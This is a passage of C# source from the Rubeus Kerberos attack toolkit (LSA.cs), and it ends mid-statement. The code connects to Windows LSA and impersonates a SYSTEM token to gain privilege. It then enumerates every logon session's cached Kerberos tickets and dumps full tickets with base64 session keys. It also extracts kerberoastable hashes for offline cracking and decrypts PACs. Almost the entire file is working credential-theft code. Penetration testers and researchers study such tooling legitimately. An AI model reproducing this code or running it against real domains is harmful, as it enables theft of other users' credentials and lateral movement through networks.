b'\xef\xbb\xbfusing Asn1;\nusing System;\nusing System.Collections.Generic;\nusing System.ComponentModel;\nusing System.Runtime.InteropServices;\nusing System.Text.RegularExpressions;\nusing System.Security.AccessControl;\nusing System.Globalization;\nusing Microsoft.Win32;\nusing ConsoleTables;\nusing System.Security.Principal;\nusing Rubeus.lib.Interop;\nusing System.IO;\nusing Rubeus.Kerberos;\nusing Rubeus.Kerberos.PAC;\nusing System.Linq;\n\nnamespace Rubeus\n{\n    public class LSA\n    {\n        #region LSA interaction\n\n        public enum TicketDisplayFormat : int\n        {\n            None = 0,           // if we\'re just after enumerated tickets\n            Triage = 1,         // triage table output\n            Klist = 2,          // traditional klist format\n            Full = 3            // full ticket data extraction (a la "dump")\n        }\n\n        public class SESSION_CRED\n        {\n            // contains information on a logon session and any associated credentials\n            //  used/returned by ExtractTickets\n\n            public LogonSessionData LogonSession;\n\n            public List<KRB_TICKET> Tickets;\n        }\n\n        public class KRB_TICKET\n        {\n            // contains cache info (i.e. KERB_TICKET_CACHE_INFO_EX) and the full .kirbi\n            public string ClientName;\n            public string ClientRealm;\n            public string ServerName;\n            public string ServerRealm;\n            public DateTime StartTime;\n            public DateTime EndTime;\n            public DateTime RenewTime;\n            public Int32 EncryptionType;\n            public Interop.TicketFlags TicketFlags;\n            public KRB_CRED KrbCred;\n        }\n\n        public static IntPtr LsaRegisterLogonProcessHelper()\n        {\n            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application\n            //  used for Kerberos ticket enumeration for ALL users\n\n            var logonProcessName = "User32LogonProcesss"; // yes I know this is "weird" ;)\n            Interop.LSA_STRING_IN LSAString;\n            var lsaHandle = IntPtr.Zero;\n            UInt64 securityMode = 0;\n\n            LSAString.Length = (ushort)logonProcessName.Length;\n            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);\n            LSAString.Buffer = logonProcessName;\n\n            var ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);\n\n            return lsaHandle;\n        }\n\n        public static IntPtr GetLsaHandle()\n        {\n            // returns a handle to LSA\n            //  uses LsaConnectUntrusted() if not in high integrity\n            //  uses LsaRegisterLogonProcessHelper() if in high integrity\n\n            IntPtr lsaHandle;\n\n            if (!Helpers.IsHighIntegrity())\n            {\n                int retCode = Interop.LsaConnectUntrusted(out lsaHandle);\n            }\n\n            else\n            {\n                lsaHandle = LsaRegisterLogonProcessHelper();\n\n                // if the original call fails then it is likely we don\'t have SeTcbPrivilege\n                // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\\SYSTEM Token\n                if (lsaHandle == IntPtr.Zero)\n                {\n                    var currentName = WindowsIdentity.GetCurrent().Name;\n\n                    if (Helpers.IsSystem())\n                    {\n                        // if we\'re already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper\n                        lsaHandle = LsaRegisterLogonProcessHelper();\n                    }\n                    else\n                    {\n                        // elevated but not system, so gotta GetSystem() first\n                        if (!Helpers.GetSystem())\n                        {\n                            throw new Exception("Could not elevate to system");\n                        }\n                        // should now have the proper privileges to get a Handle to LSA\n                        lsaHandle = LsaRegisterLogonProcessHelper();\n                        // we don\'t need our NT AUTHORITY\\SYSTEM Token anymore so we can revert to our original token\n                        Interop.RevertToSelf();\n                    }\n                }\n            }\n\n            return lsaHandle;\n        }\n\n        public static KRB_CRED ExtractTicket(IntPtr lsaHandle, int authPack, LUID userLogonID, string targetName, UInt32 ticketFlags = 0)\n        {\n            // extracts an encoded KRB_CRED for a specified userLogonID (LUID) and targetName (SPN)\n            // by calling LsaCallAuthenticationPackage() w/ the KerbRetrieveEncodedTicketMessage message type\n\n            var responsePointer = IntPtr.Zero;\n            var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();\n            var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();\n            var returnBufferLength = 0;\n            var protocalStatus = 0;\n            KRB_CRED ticketKirbi = null;\n\n            // signal that we want encoded .kirbi\'s returned\n            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;\n\n            // the specific logon session ID\n            request.LogonId = userLogonID;\n            //request.TicketFlags = ticketFlags;\n            request.TicketFlags = 0x0;\n            // Note: ^ if a ticket has the forwarded flag (instead of initial), hard specifying the ticket\n            //      flags here results in no match, and a new (RC4_HMAC?) ticket is requested but not cached\n            //      from https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_retrieve_tkt_request :\n            //          "If there is no match in the cache, a new ticket with the default flag values will be requested."\n            //  Yes, I know this is weird. No, I have no idea why it happens. Specifying 0x0 (the default) will return just the main\n            //      (initial) TGT, or a forwarded ticket if that\'s all that exists (a la the printer bug)\n            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED - return the ticket as a KRB_CRED credential\n            request.EncryptionType = 0x0;\n            \n            // the target ticket name we want the ticket for\n            var tName = new Interop.UNICODE_STRING(targetName);\n            request.TargetName = tName;\n\n            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST\n            //      for KerbRetrieveEncodedTicketMessages\n\n            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len\n            var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));\n            var newStructSize = structSize + tName.MaximumLength;\n            var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);\n\n            // marshal the struct from a managed object to an unmanaged block of memory.\n            Marshal.StructureToPtr(request, unmanagedAddr, false);\n            \n            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST\n            var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));\n\n            // copy unicode chars to the new location\n            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);\n\n            // update the target name buffer ptr            \n            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);\n\n            // actually get the data\n            int retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack,\n                unmanagedAddr, newStructSize, out responsePointer,\n                out returnBufferLength, out protocalStatus);\n            \n            // TODO: is this needed?\n            //if (retCode != 0)\n            //{\n            //    throw new NtException(retCode);\n            //}\n\n            // translate the LSA error (if any) to a Windows error\n            var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);\n\n            if ((retCode == 0) && ((uint)winError == 0) &&\n                (returnBufferLength != 0))\n            {\n                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure\n                response =\n                    (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(\n                        (System.IntPtr)responsePointer,\n                        typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));\n\n                var encodedTicketSize = response.Ticket.EncodedTicketSize;\n\n                // extract the ticket, build a KRB_CRED object, and add to the cache\n                var encodedTicket = new byte[encodedTicketSize];\n                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0,\n                    encodedTicketSize);\n\n                ticketKirbi = new KRB_CRED(encodedTicket);\n            }\n            else\n            {\n                var errorMessage = new Win32Exception((int)winError).Message;\n                Console.WriteLine(\n                    "\\r\\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \\"{1}\\" : {2}",\n                    winError, targetName, errorMessage);\n            }\n\n            // clean up\n            Interop.LsaFreeReturnBuffer(responsePointer);\n            Marshal.FreeHGlobal(unmanagedAddr);\n\n            return ticketKirbi;\n        }\n\n        public static List<SESSION_CRED> EnumerateTickets(bool extractTicketData = false, LUID targetLuid = new LUID(), string targetService = null, string targetUser = null, string targetServer = null, bool includeComputerAccounts = true, bool silent = false)\n        {\n            //  Enumerates Kerberos tickets with various targeting options\n\n            //  targetLuid              -   the target logon ID (LUID) to extract tickets for. Requires elevation.\n            //  targetService           -   the target service name to extract tickets for (use "krbtgt" for TGTs)\n            //  extractTicketData       -   extract full ticket data instead of just metadata information\n            //  targetUser              -   the target user name to extract tickets for\n            //  targetServer            -   the target full SPN (i.e. cifs/machine.domain.com) to extract tickets for\n            //  includeComputerAccounts -   bool to include computer accounts in the output\n\n            //  For elevated enumeration, the code first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper() connect to LSA\n            //      then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets\n            //      and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type\n            //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)\n\n            //  For elevated enumeration, the code first uses LsaConnectUntrusted() to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type\n            //      to enumerate all cached tickets, then uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type\n            //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)\n\n            // adapted partially from Vincent LE TOUX\' work\n            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950\n            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/\n            // also Jared Atkinson\'s work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1\n\n\n            // sanity checks\n            if (!Helpers.IsHighIntegrity() && ( ((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(targetUser)) ) )\n            {\n                Console.WriteLine("[X] You need to be in high integrity for the actions specified.");\n                return null;\n            }\n\n            if (!silent)\n            {\n                // silent mode is for "monitor"/"harvest" to prevent this data display each time\n                if (!String.IsNullOrEmpty(targetService))\n                {\n                    Console.WriteLine("[*] Target service  : {0:x}", targetService);\n                }\n                if (!String.IsNullOrEmpty(targetServer))\n                {\n                    Console.WriteLine("[*] Target server   : {0:x}", targetServer);\n                }\n                if (!String.IsNullOrEmpty(targetUser))\n                {\n                    Console.WriteLine("[*] Target user     : {0:x}", targetUser);\n                }\n                if (((ulong)targetLuid != 0))\n                {\n                    Console.WriteLine("[*] Target LUID     : {0:x}", targetLuid);\n                }\n\n                Console.WriteLine("[*] Current LUID    : {0}\\r\\n", Helpers.GetCurrentLUID());\n            }\n\n            int retCode;\n            int authPack;\n            var name = "kerberos";\n            var sessionCreds = new List<SESSION_CRED>();\n\n            Interop.LSA_STRING_IN LSAString;\n            LSAString.Length = (ushort)name.Length;\n            LSAString.MaximumLength = (ushort)(name.Length + 1);\n            LSAString.Buffer = name;\n\n            var lsaHandle = GetLsaHandle();\n\n            try\n            {\n                // obtains the unique identifier for the kerberos authentication package.\n                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);\n\n                // STEP 1 - enumerate all current longon session IDs (LUID)\n                //          if not elevated, this returns the current user\'s LUID\n                //          if elevated, this returns ALL LUIDs\n                foreach (var luid in EnumerateLogonSessions())\n                {\n                    // if we\'re targeting a specific LUID, check and skip if needed\n                    if (((ulong)targetLuid != 0) && (luid != targetLuid))\n                        continue;\n\n                    // STEP 2 - get the actual data for this logon session (username, domain, logon time, etc.)\n                    var logonSessionData = new LogonSessionData();\n                    try\n                    {\n                        logonSessionData = GetLogonSessionData(luid);\n                    }\n                    catch\n                    {\n                        continue;\n                    }\n\n                    // start building the result object we want\n                    SESSION_CRED sessionCred = new SESSION_CRED();\n                    sessionCred.LogonSession = logonSessionData;\n                    sessionCred.Tickets = new List<KRB_TICKET>();\n                    \n                    // phase 1 of targeting\n\n                    // exclude computer accounts unless instructed otherwise\n                    if (!includeComputerAccounts && Regex.IsMatch(logonSessionData.Username, ".*\\\\$$"))\n                        continue;\n                    // if we\'re enumerating tickets/logon sessions for a specific user\n                    if (!String.IsNullOrEmpty(targetUser) && !Regex.IsMatch(logonSessionData.Username, Regex.Escape(targetUser), RegexOptions.IgnoreCase))\n                        continue;\n\n                    var ticketsPointer = IntPtr.Zero;\n                    var returnBufferLength = 0;\n                    var protocalStatus = 0;\n\n                    var ticketCacheRequest = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();\n                    var ticketCacheResponse = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();\n                    Interop.KERB_TICKET_CACHE_INFO_EX ticketCacheResult;\n\n                    // input object for querying the ticket cache for a specific logon ID\n                    ticketCacheRequest.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;\n                    if (Helpers.IsHighIntegrity())\n                    {\n                        ticketCacheRequest.LogonId = logonSessionData.LogonID;\n                    }\n                    else\n                    {\n                        // if we\'re not elevated, we have to have a LUID of 0 here to prevent failure\n                        ticketCacheRequest.LogonId = new LUID();\n                    }\n                    \n                    var tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ticketCacheRequest));\n                    Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);\n\n                    // STEP 3 - query LSA, specifying we want information for the ticket cache for this particular LUID\n                    retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr,\n                        Marshal.SizeOf(ticketCacheRequest), out ticketsPointer, out returnBufferLength,\n                        out protocalStatus);\n\n                    if (retCode != 0)\n                    {\n                        throw new NtException(retCode);\n                    }\n\n                    if (ticketsPointer != IntPtr.Zero)\n                    {\n                        // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure\n                        ticketCacheResponse = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(\n                            (System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));\n                        var count2 = ticketCacheResponse.CountOfTickets;\n\n                        if (count2 != 0)\n                        {\n                            bool krbtgtFound = false; // for sessions with multiple TGTs (krbtgt service targets), only include one ticket\n\n                            // get the size of the structures we\'re iterating over\n                            var dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));\n\n                            for (var j = 0; j < count2; j++)\n                            {\n                                // iterate through the result structures\n                                var currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));\n\n                                // parse the new ptr to the appropriate structure\n                                ticketCacheResult = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(\n                                    currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));\n\n                                KRB_TICKET ticket = new KRB_TICKET();\n                                ticket.StartTime = DateTime.FromFileTime(ticketCacheResult.StartTime);\n                                ticket.EndTime = DateTime.FromFileTime(ticketCacheResult.EndTime);\n                                ticket.RenewTime = DateTime.FromFileTime(ticketCacheResult.RenewTime);\n                                ticket.TicketFlags = (Interop.TicketFlags)ticketCacheResult.TicketFlags;\n                                ticket.EncryptionType = ticketCacheResult.EncryptionType;\n                                ticket.ServerName = Marshal.PtrToStringUni(ticketCacheResult.ServerName.Buffer, ticketCacheResult.ServerName.Length / 2);\n                                ticket.ServerRealm = Marshal.PtrToStringUni(ticketCacheResult.ServerRealm.Buffer, ticketCacheResult.ServerRealm.Length / 2);\n                                ticket.ClientName = Marshal.PtrToStringUni(ticketCacheResult.ClientName.Buffer, ticketCacheResult.ClientName.Length / 2);\n                                ticket.ClientRealm = Marshal.PtrToStringUni(ticketCacheResult.ClientRealm.Buffer, ticketCacheResult.ClientRealm.Length / 2);\n\n                                bool includeTicket = true;\n\n                                if ( !String.IsNullOrEmpty(targetService) && !Regex.IsMatch(ticket.ServerName, String.Format(@"^{0}/.*", Regex.Escape(targetService)), RegexOptions.IgnoreCase))\n                                {\n                                    includeTicket = false;\n                                }\n                                if (!String.IsNullOrEmpty(targetServer) && !Regex.IsMatch(ticket.ServerName, String.Format(@".*/{0}", Regex.Escape(targetServer)), RegexOptions.IgnoreCase))\n                                {\n                                    includeTicket = false;\n                                }\n\n                                if (Regex.IsMatch(ticket.ServerName, @"^krbtgt/.*", RegexOptions.IgnoreCase))\n                                {\n                                    if(krbtgtFound)\n                                    {\n                                        includeTicket = false;\n                                    }\n                                    else\n                                    {\n                                        krbtgtFound = true;\n                                    }\n                                }\n\n                                if (includeTicket)\n                                {\n                                    if (extractTicketData)\n                                    {\n                                        // STEP 4 - query LSA again, specifying we want the actual ticket data for this particular ticket (.kirbi/KRB_CRED)\n                                        ticket.KrbCred = ExtractTicket(lsaHandle, authPack, ticketCacheRequest.LogonId, ticket.ServerName, ticketCacheResult.TicketFlags);\n                                    }\n                                    sessionCred.Tickets.Add(ticket);\n                                }\n                            }\n                        }\n                    }\n\n                    // cleanup\n                    Interop.LsaFreeReturnBuffer(ticketsPointer);\n                    Marshal.FreeHGlobal(tQueryPtr);\n\n                    sessionCreds.Add(sessionCred);\n                }\n                // disconnect from LSA\n                Interop.LsaDeregisterLogonProcess(lsaHandle);\n\n                return sessionCreds;\n            }\n            catch (Exception ex)\n            {\n                Console.WriteLine("[X] Exception: {0}", ex);\n                return null;\n            }\n        }\n\n        #endregion\n\n\n        #region Output\n\n        public static void DisplaySessionCreds(List<SESSION_CRED> sessionCreds, TicketDisplayFormat displayFormat, bool showAll = false)\n        {\n            // displays a given .kirbi (KRB_CRED) object, with display options\n\n            //  sessionCreds            -   list of one or more SESSION_CRED objects\n            //  displayFormat           -   the TicketDisplayFormat to display the tickets in ("Triage" table, traditional "Klist", or "Full" for full ticket extraction)\n            //  displayTGT              -   shortened display for monitor/harvesting\n            //  displayB64ticket        -   display a base64 encoded version of the ticket\n            //  extractKerberoastHash   -   extract out the rc4_hmac "kerberoastable" hash, if possible\n\n            // used for table output\n            var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");\n\n            foreach (var sessionCred in sessionCreds)\n            {\n                // don\'t display logon sessions with no tickets\n                if( (sessionCred.Tickets.Count == 0) && (!showAll))\n                {\n                    continue;\n                }\n\n                if ( (displayFormat == TicketDisplayFormat.Full) || displayFormat == TicketDisplayFormat.Klist)\n                {\n                    Console.WriteLine("  UserName                 : {0}", sessionCred.LogonSession.Username);\n                    Console.WriteLine("  Domain                   : {0}", sessionCred.LogonSession.LogonDomain);\n                    Console.WriteLine("  LogonId                  : {0}", sessionCred.LogonSession.LogonID);\n                    Console.WriteLine("  UserSID                  : {0}", sessionCred.LogonSession.Sid);\n                    Console.WriteLine("  AuthenticationPackage    : {0}", sessionCred.LogonSession.AuthenticationPackage);\n                    Console.WriteLine("  LogonType                : {0}", sessionCred.LogonSession.LogonType);\n                    Console.WriteLine("  LogonTime                : {0}", sessionCred.LogonSession.LogonTime);\n                    Console.WriteLine("  LogonServer              : {0}", sessionCred.LogonSession.LogonServer);\n                    Console.WriteLine("  LogonServerDNSDomain     : {0}", sessionCred.LogonSession.DnsDomainName);\n                    Console.WriteLine("  UserPrincipalName        : {0}\\r\\n", sessionCred.LogonSession.Upn);\n                }\n\n                for(int j = 0; j < sessionCred.Tickets.Count; j++)\n                {\n                    var ticket = sessionCred.Tickets[j];\n\n                    if (displayFormat == TicketDisplayFormat.Triage)\n                    {\n                        table.AddRow(sessionCred.LogonSession.LogonID.ToString(), String.Format("{0} @ {1}", ticket.ClientName, ticket.ClientRealm), ticket.ServerName, ticket.EndTime.ToString());\n                    }\n                    else if (displayFormat == TicketDisplayFormat.Klist)\n                    {\n                        Console.WriteLine("    [{0:x}] - 0x{1:x} - {2}", j, (int)ticket.EncryptionType, (Interop.KERB_ETYPE)ticket.EncryptionType);\n                        Console.WriteLine("      Start/End/MaxRenew: {0} ; {1} ; {2}", ticket.StartTime, ticket.EndTime, ticket.RenewTime);\n                        Console.WriteLine("      Server Name       : {0} @ {1}", ticket.ServerName, ticket.ServerRealm);\n                        Console.WriteLine("      Client Name       : {0} @ {1}", ticket.ClientName, ticket.ClientRealm);\n                        Console.WriteLine("      Flags             : {0} ({1:x})\\r\\n", ticket.TicketFlags, (UInt32)ticket.TicketFlags);\n                    }\n                    else if (displayFormat == TicketDisplayFormat.Full)\n                    {\n                        if (ticket.KrbCred != null)\n                        {\n                            DisplayTicket(ticket.KrbCred, 4, false, true, false);\n                        }\n                    }\n                }\n            }\n\n            if (displayFormat == TicketDisplayFormat.Triage)\n            {\n                // write out the table\n                table.Write();\n            }\n        }\n\n        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = false, bool nowrap = false, byte[] serviceKey = null, byte[] asrepKey = null, string serviceUser = "", string serviceDomain = "", byte[] krbKey = null)\n        {\n            // displays a given .kirbi (KRB_CRED) object, with display options\n\n            //  cred                    -   the KRB_CRED object to display\n            //  indentLevel             -   level of indent, default of 2\n            //  displayTGT              -   shortened display for monitor/harvesting\n            //  displayB64ticket        -   display a base64 encoded version of the ticket\n            //  extractKerberoastHash   -   extract out the rc4_hmac "kerberoastable" hash, if possible\n            //  nowrap                  -   don\'t wrap base64 ticket output\n\n            var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());\n            var sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());\n            var keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);\n            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);        \n            var base64ticket = Convert.ToBase64String(cred.Encode().Encode());\n            string indent = new string(\' \', indentLevel);\n            string serviceName = sname.Split(\'/\')[0];\n\n\n            if (displayTGT)\n            {\n                // abbreviated display used for monitor/etc.\n                Console.WriteLine("{0}User                  :  {1}@{2}", indent, userName, cred.enc_part.ticket_info[0].prealm);\n                Console.WriteLine("{0}StartTime             :  {1}", indent, cred.enc_part.ticket_info[0].starttime.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n                Console.WriteLine("{0}EndTime               :  {1}", indent, cred.enc_part.ticket_info[0].endtime.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n                Console.WriteLine("{0}RenewTill             :  {1}", indent, cred.enc_part.ticket_info[0].renew_till.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n                Console.WriteLine("{0}Flags                 :  {1}", indent, cred.enc_part.ticket_info[0].flags);\n                Console.WriteLine("{0}Base64EncodedTicket   :\\r\\n", indent);\n\n                if (false)\n                {\n                    foreach (var line in Helpers.Split(base64ticket, 100))\n                    {\n                        Console.WriteLine("{0}  {1}", indent, line);\n                    }\n                }\n                else\n                {\n                    Console.WriteLine("{0}  {1}", indent, base64ticket);\n                }\n            }\n            else\n            {\n                // full display with session key\n                Console.WriteLine("\\r\\n{0}ServiceName              :  {1}", indent, sname);\n                Console.WriteLine("{0}ServiceRealm             :  {1}", indent, cred.enc_part.ticket_info[0].srealm);\n                Console.WriteLine("{0}UserName                 :  {1}", indent, userName);\n                Console.WriteLine("{0}UserRealm                :  {1}", indent, cred.enc_part.ticket_info[0].prealm);\n                Console.WriteLine("{0}StartTime                :  {1}", indent, cred.enc_part.ticket_info[0].starttime.ToLocalTime());\n                Console.WriteLine("{0}EndTime                  :  {1}", indent, cred.enc_part.ticket_info[0].endtime.ToLocalTime());\n                Console.WriteLine("{0}RenewTill                :  {1}", indent, cred.enc_part.ticket_info[0].renew_till.ToLocalTime());\n                Console.WriteLine("{0}Flags                    :  {1}", indent, cred.enc_part.ticket_info[0].flags);\n                Console.WriteLine("{0}KeyType                  :  {1}", indent, keyType);\n                Console.WriteLine("{0}Base64(key)              :  {1}", indent, b64Key);\n\n                //We display the ASREP decryption key as this is needed for decrypting\n                //PAC_CREDENTIAL_INFO inside both the AS-REP and TGS-REP Tickets when\n                //PKINIT is used\n                if (asrepKey != null)\n                    Console.WriteLine("{0}ASREP (key)              :  {1}", indent, Helpers.ByteArrayToString(asrepKey));\n\n                if (displayB64ticket)\n                {\n                    // if we\'re displaying the base64 encoding of the ticket\n                    Console.WriteLine("{0}Base64EncodedTicket   :\\r\\n", indent);\n                    if (false)\n                    {\n                        foreach (var line in Helpers.Split(base64ticket, 100))\n                        {\n                            Console.WriteLine("{0}  {1}", indent, line);\n                        }\n                    }\n                    else\n                    {\n                        Console.WriteLine("{0}  {1}", indent, base64ticket);\n                    }\n                }\n\n                else if (extractKerberoastHash && (serviceName != "krbtgt"))\n                {\n                    // if this isn\'t a TGT, try to display a Kerberoastable hash\n                    if (!keyType.Equals("rc4_hmac") && !keyType.Equals("aes256_cts_hmac_sha1"))\n                    {\n                        // can only display rc4_hmac as it doesn\'t have a salt. DES/AES keys require the user/domain as a salt,\n                        //      and we don\'t have the user account name that backs the requested SPN for the ticket, no no dice :(\n                        Console.WriteLine("\\r\\n[!] Service ticket uses encryption key type \'{0}\', unable to extract hash and salt.", keyType);\n                    }\n                    else if (keyType.Equals("rc4_hmac"))\n                    {\n                        Roast.DisplayTGShash(cred);\n                    }\n                    else if (!String.IsNullOrEmpty(serviceUser))\n                    {\n                        if (String.IsNullOrEmpty(serviceDomain))\n                        {\n                            serviceDomain = cred.enc_part.ticket_info[0].prealm;\n                        }\n                        if (serviceUser.EndsWith("$"))\n                        {\n                            serviceUser = String.Format("host{0}.{1}", serviceUser.TrimEnd(\'$\').ToLower(), serviceDomain.ToLower());\n                        }\n                        Roast.DisplayTGShash(cred, false, serviceUser, serviceDomain);\n                    }\n                    else\n                    {\n                        Console.WriteLine("[!] AES256 in use but no \'/serviceuser\' passed, unable to generate crackable hash.");\n                    }\n                }\n            }\n\n            if (serviceKey != null) {\n                \n                try\n                {\n                    var decryptedEncTicket = cred.tickets[0].Decrypt(serviceKey, asrepKey);\n                    PACTYPE pt = decryptedEncTicket.GetPac(asrepKey);\n                    if (pt == null)\n                    {\n                        Console.WriteLine("[X] Unable to get the PAC");\n                        return;\n                    }\n                    \n                    if (krbKey == null && (serviceName == "krbtgt") && (cred.enc_part.ticket_info[0].srealm.ToUpper() == sname.Split(\'/\')[1].ToUpper()))\n                    {\n                        krbKey = serviceKey;\n                    }\n                    var validated = decryptedEncTicket.ValidatePac(serviceKey, krbKey);\n\n                    Console.WriteLine("{0}Decrypted PAC            :", indent);\n\n                    foreach(var pacInfoBuffer in pt.PacInfoBuffers) {\n\n                        if (pacInfoBuffer is ClientName cn)\n                        {\n                            Console.WriteLine("{0}  ClientName             :", indent);\n                            Console.WriteLine("{0}    Client Id            : {1}", indent, cn.ClientId.ToLocalTime().ToString(CultureInfo.CurrentCulture));\n                            Console.WriteLine("{0}    Client Name          : {1}", indent, cn.Name);\n                        }\n                        else if (pacInfoBuffer is UpnDns upnDns)\n                        {\n                            Console.WriteLine("{0}  UpnDns                 :", indent);\n                            Console.WriteLine("{0}    DNS Domain Name      : {1}", indent, upnDns.DnsDomainName);\n                            Console.WriteLine("{0}    UPN                  : {1}", indent, upnDns.Upn);\n                            Console.WriteLine("{0}    Flags                : {1}", indent, upnDns.Flags);\n                        }\n                        else if (pacInfoBuffer is SignatureData sigData)\n                        {\n                            string validation = "VALID";\n                            int i2 = 0;\n                            if (sigData.Type == PacInfoBufferType.ServerChecksum && !validated.Item1)\n                            {\n                                validation = "INVALID";\n                            }\n                            else if (sigData.Type == PacInfoBufferType.KDCChecksum && !validated.Item2 && krbKey != null)\n                            {\n                                validation = "INVALID";\n                            }\n                            else if (sigData.Type == PacInfoBufferType.TicketChecksum && krbKey != null && !validated.Item3)\n                            {\n                                validation = "INVALID";\n                            }\n                            else if ((sigData.Type == PacInfoBufferType.KDCChecksum || sigData.Type == PacInfoBufferType.TicketChecksum) && krbKey == null)\n                            {\n                                validation = "UNVALIDATED";\n                            }\n                            if (sigData.Type == PacInfoBufferType.KDCChecksum)\n                            {\n                                i2 = 3;\n                            }\n                            Console.WriteLine("{0}  {1}         {2}:", indent, sigData.Type.ToString(), new string(\' \', i2));\n                            Console.WriteLine("{0}    Signature Type       : {1}", indent, sigData.SignatureType);\n                            Console.WriteLine("{0}    Signature            : {1} ({2})", indent, Helpers.ByteArrayToString(sigData.Signature), validation);\n                        }\n                        else if (pacInfoBuffer is LogonInfo li)\n                        {\n                            Console.WriteLine("{0}  LogonInfo              :", indent);\n                            try\n                            {\n                                Console.WriteLine("{0}    LogonTime            : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogonTime.LowDateTime | ((long)li.KerbValidationInfo.LogonTime.HighDateTime << 32)).ToLocalTime());\n                            }\n                            catch\n                            {\n                                Console.WriteLine("{0}    LogonTime            : {1}", indent, li.KerbValidationInfo.LogonTime);\n                            }\n                            try\n                            {\n                                Console.WriteLine("{0}    LogoffTime           : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());\n                            }\n                            catch\n                            {\n                                Console.WriteLine("{0}    LogoffTime           : {1}", indent, li.KerbValidationInfo.LogoffTime);\n                            }\n                            try\n                            {\n                                Console.WriteLine("{0}    KickOffTime          : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.KickOffTime.LowDateTime | ((long)li.KerbValidationInfo.KickOffTime.HighDateTime << 32)).ToLocalTime());\n                            }\n                            catch\n                            {\n                                Console.WriteLine("{0}    KickOffTime          : {1}", indent, li.KerbValidationInfo.KickOffTime);\n                            }\n                            try\n                            {\n                                Console.WriteLine("{0}    PasswordLastSet      : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordLastSet.LowDateTime | ((long)li.KerbValidationInfo.PasswordLastSet.HighDateTime << 32)).ToLocalTime());\n                            }\n                            catch\n                            {\n                                Console.WriteLine("{0}    PasswordLastSet      : {1}", indent, li.KerbValidationInfo.PasswordLastSet);\n                            }\n                            try\n                            {\n                                Console.WriteLine("{0}    PasswordCanChange    : {1}", indent, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordCanChange.LowDateTime | 